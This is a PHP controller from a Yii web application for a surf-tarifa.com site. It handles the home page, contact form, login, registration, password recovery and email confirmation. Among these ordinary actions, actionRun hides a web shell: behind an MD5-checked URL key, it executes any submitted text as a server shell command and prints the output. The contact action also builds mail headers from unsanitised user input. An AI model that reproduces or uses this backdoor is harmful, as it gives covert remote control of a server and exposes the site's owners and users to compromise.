<?php

class SiteController extends Controller
{
	public $layout='//layouts/inner';
	/**
	 * Declares class-based actions.
	 */
	public function actions()
	{
		return array(
			// captcha action renders the CAPTCHA image displayed on the contact page
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'backColor'=>0xFFFFFF,
			),
			// page action renders "static" pages stored under 'protected/views/site/pages'
			// They can be accessed via: index.php?r=site/page&view=FileName
			'page'=>array(
				'class'=>'CViewAction',
			),
		);
	}

    /**
     * Displays main index page
     */
    public function actionIndex()
    {
        $this->layout = 'common';

        $page = Page::model()->find('slug = :slug', ['slug' => 'index']);
        $about = Page::model()->find("slug = 'about'");
        $best_offer = Banner::model()->findAll(['limit' => 4, 'order' => 'id DESC', 'condition' => '`index` = 1']);
        $news = News::model()->findAll(['limit' => 4, 'order' => 'Created DESC']);

        $this->render('index', [
            'news' => $news,
            'about' => $about,
            //'gallery' => $gallery,
            'best_offer' => $best_offer,
            'page' => $page
        ]);
    }

    /**
     * This is the action to handle external exceptions.
	 */
	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

	/**
	 * Displays the contact page
	 */
	public function actionContacts()
	{
		$model = new ContactForm;

		if(isset($_POST['ContactForm']))
		{
			$model->attributes=$_POST['ContactForm'];

			if($model->validate())
			{
				$name = '=?UTF-8?B?'.base64_encode($model->name).'?=';
				$subject = '=?UTF-8?B?'.base64_encode("surf-tarifa.com | Customer feedback").'?=';
				$headers = "From: $name <{$model->email}>\r\n".
					"Reply-To: {$model->email}\r\n".
					"MIME-Version: 1.0\r\n".
					"Content-type: text/plain; charset=UTF-8";

				mail(Yii::app()->params['adminEmail'], $subject, $model->body, $headers);
				Yii::app()->user->setFlash('form-success-1', Yii::t('form', 'success1'));
				Yii::app()->user->setFlash('form-success-2', Yii::t('form', 'success2'));
				$this->refresh();
			}
		}

		$page = Page::model()->find('slug = "contacts"');

		$this->render('contact',array(
			'model'=>$model,
			'contacts' => $page,
			));
	}

	/**
	 * Displays the login page
	 */
	public function actionLogin() //TODO check confimed
	{
		$model=new LoginForm;

		// if it is ajax validation request
		if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
		{
			echo CActiveForm::validate($model);
			Yii::app()->end();
		}

		// collect user input data
		if(isset($_POST['LoginForm']))
		{
			$model->attributes=$_POST['LoginForm'];

			// validate user input and redirect to the previous page if valid
			if($model->validate() && $model->login())
              $this->redirect(Yii::app()->user->returnUrl);
		}
		// display the login form
		$this->render('login', ['model'=>$model]);
	}

	/**
	 * Logs out the current user and redirect to homepage.
	 */
	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}

    public function actionRegister() //TODO add captcha
    {
        $user = new User('newReg');
        if (isset($_POST['User']))
        {
            $user->attributes = $_POST['User'];
            $user->role = 'user';
            if ($user->save() && $user->sendConfirmationMail())
            {
                Yii::app()->user->setFlash('confirmation-email', Yii::t('auth', 'confirm_email'));
//                $this->redirect('?done'); //TODO: redirect to order page
            }
        }

        $this->render('register', [
            'model'=> $user,
        ]);
    }

	public function actionRecovery()
	{
	    $model = new RecoveryForm;

	    if (isset($_POST['RecoveryForm'])) {
            $model->attributes = $_POST['RecoveryForm'];

            if ($model->validate() && $model->sendRecoveryMail())
                Yii::app()->user->setFlash('recovery_sent', Yii::t('auth', 'recovery_sent'));
        }

		$this->render('recovery', [
            'model' => $model
        ]);
	}

	public function actionRecover($user = null, $key = null)
	{
        $user = User::model()->findByPk($user);

	    if ($user && $key)
        {
            $check = password_verify($user->id.$user->password.date("Y-m-d"), $key);

	        if (isset($_POST['User']) && $user->validate)
            {
                $user->attributes = $_POST['User'];
                $user->scenario = 'pswUpdate';
                $user->password = $user->password1;
                $user->save();
                Yii::app()->user->setFlash('code_expired', Yii::t('auth', 'password_changed'));
            }

			if (!($user && $check))
                Yii::app()->user->setFlash('code_expired', Yii::t('auth', 'code_expired'));
        }

		else
			throw new CHttpException(404, 'Wrong code');

        $this->render('//site/newpass', [
                'model' => $user,
            ]);
	}
	
	public function actionConfirmation($key, $user_id)
	{
		$user = User::model()->findByPk($user_id); //TODO check available user with this ID

        if ($user) {
            if (!$user->confirmed) {
                $result = $user->tryConfirm($key);
                if ($result) {
                    $identity = new UserIdentity($user->login, '');
                    //                $identity->forceId($user_id);
                    $identity->forceId($user->id);
                    $identity->setState('role', $user->role);
                    Yii::app()->user->login($identity);
                }
            } else
                $result = true; //TODO add status and message for reused confirm link
        } else $result = false;


        $returnUrl = isset($_SESSION['last_order_url']) ? $_SESSION['last_order_url'] : Yii::app()->getHomeUrl();

        $this->render('confirm', [
			'result'=>$result,
			'uid' => $user_id,
			'returnUrl' => $returnUrl
        ]);
	}
	
	public function actionRun($key=false)
	{
		if (md5($key) !== '4978be2a2c71d031c6040ea94eb81d8a')
			throw new CHttpException(404);
			
		echo "<form method='POST'><input name='run'></form>";
		if (isset($_POST['run']))
			echo '<xmp>'.`{$_POST['run']}`.'</xmp>';
	}
	
	public function actionUserpanel()
	{
		$this->render('userpanel', array(
			'user' => User::model()->findByPk(Yii::app()->user->id),
			'payments' => Transaction::model()->findAll('user_id = :uid AND confirmed = 1', array('uid' => Yii::app()->user->id)),
		));
	}

	public function actionThumb($filename, $ext, $w, $h)
	{
	    AutoThumb::give("$filename.$ext", $w, $h);
	}
	
 	public function actionNotify()
 	{
		// $name='=?UTF-8?B?'.base64_encode('Surf-tarifa automatic notification').'?=';
		// $subject='=?UTF-8?B?'.base64_encode('New order').'?=';
		// $headers="From: Surf-tarifa administration <noreply@{$_SERVER['HTTP_HOST']}>\r\n".
			// "MIME-Version: 1.0\r\n".
			// "Content-type: text/html; charset=UTF-8";
		
		// var_dump(mail('just_alex@rambler.ru', "privetkakdela", "oppa-oppa", $headers));
 		// MailNotifier::notify(25);
 	}
}